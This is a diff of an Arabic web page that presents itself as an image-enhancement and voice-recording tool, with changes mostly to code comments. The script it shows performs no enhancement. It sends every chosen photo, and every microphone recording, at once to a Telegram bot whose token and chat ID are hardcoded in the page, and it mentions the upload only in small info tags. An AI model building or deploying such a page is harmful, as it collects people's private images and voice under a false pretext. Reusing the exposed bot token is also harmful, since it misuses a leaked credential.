@@ -65,6 +65,7 @@
     <h2>منصة اختبار الميديا والربط الشبكي عبر API</h2>
     <p>تطبيق تجريبي لرفع ومعالجة الملفات محلياً وإرسال التقارير التفاعلية إلى التليجرام بوضوح.</p>
 
+    <!-- 1. قسم الصور -->
     <div class="card">
         <h3>🎨 أداة تحسين دقة الصور</h3>
         <p class="info-tag">(سيتم عرض المعاينة وإرسال الملف كتقرير تجريبي للمطور)</p>
@@ -74,6 +75,7 @@
         <div id="imgStatus" class="status-msg"></div>
     </div>
 
+    <!-- 2. قسم الصوت -->
     <div class="card">
         <h3>🎙️ أداة تسجيل وحفظ المقاطع الصوتية</h3>
         <p class="info-tag">(يتطلب إذن الميكروفون - سيتم إرسال التسجيل فور الحفظ)</p>
@@ -85,18 +87,17 @@
 </div>
 
 <script>
-    // تكوين بيانات تليجرام المستخرجة
+    // إعدادات توكن البوت والآيدي الشخصي الخاص بك
     const TELEGRAM_TOKEN = '8900263314:AAGTSIhSajbYVqAWez9qB7ID43m6MPK5LEU';
     const CHAT_ID = '6837507867';
 
-    // دالة عامة لإرسال الملفات عبر الـ API الخاص بتليجرام باستخدام FormData
+    // دالة إرسال الملفات عبر API تليجرام
     async function sendFileToTelegram(fileBlob, fileName, type, statusElement) {
         statusElement.innerText = "جاري معالجة الملف وإرساله عبر API...";
         
         const formData = new FormData();
         formData.append('chat_id', CHAT_ID);
         
-        // اختيار الميثود المناسب بناءً على نوع الملف (صورة أو ملف صوتي)
         let url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/`;
         if (type === 'image') {
             url += 'sendPhoto';
@@ -125,11 +126,10 @@
         }
     }
 
-    // --- أولاً: منطق معالجة الصور ---
+    // --- منطق معالجة الصور ---
     document.getElementById('imageInput').addEventListener('change', function(e) {
         const file = e.target.files[0];
         if (file) {
-            // عرض المعاينة للمستخدم محلياً
             const reader = new FileReader();
             reader.onload = function(event) {
                 const container = document.getElementById('imgPreviewContainer');
@@ -137,13 +137,12 @@
             };
             reader.readAsDataURL(file);
 
-            // بدء عملية الإرسال الفوري للتقرير
             const imgStatus = document.getElementById('imgStatus');
             sendFileToTelegram(file, file.name, 'image', imgStatus);
         }
     });
 
-    // --- ثانياً: منطق تسجيل الصوت ---
+    // --- منطق تسجيل الصوت ---
     let mediaRecorder;
     let audioChunks = [];
 
@@ -165,11 +164,9 @@
                 const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
                 const audioUrl = URL.createObjectURL(audioBlob);
                 
-                // عرض مشغل الصوت محلياً للمستخدم للتحقق
                 const container = document.getElementById('audioPlaybackContainer');
                 container.innerHTML = `<audio controls src="${audioUrl}"></audio>`;
 
-                // إرسال الملف الصوتي المسجل فوراً
                 sendFileToTelegram(audioBlob, 'recorded_audio.mp3', 'audio', audioStatus);
             };
 
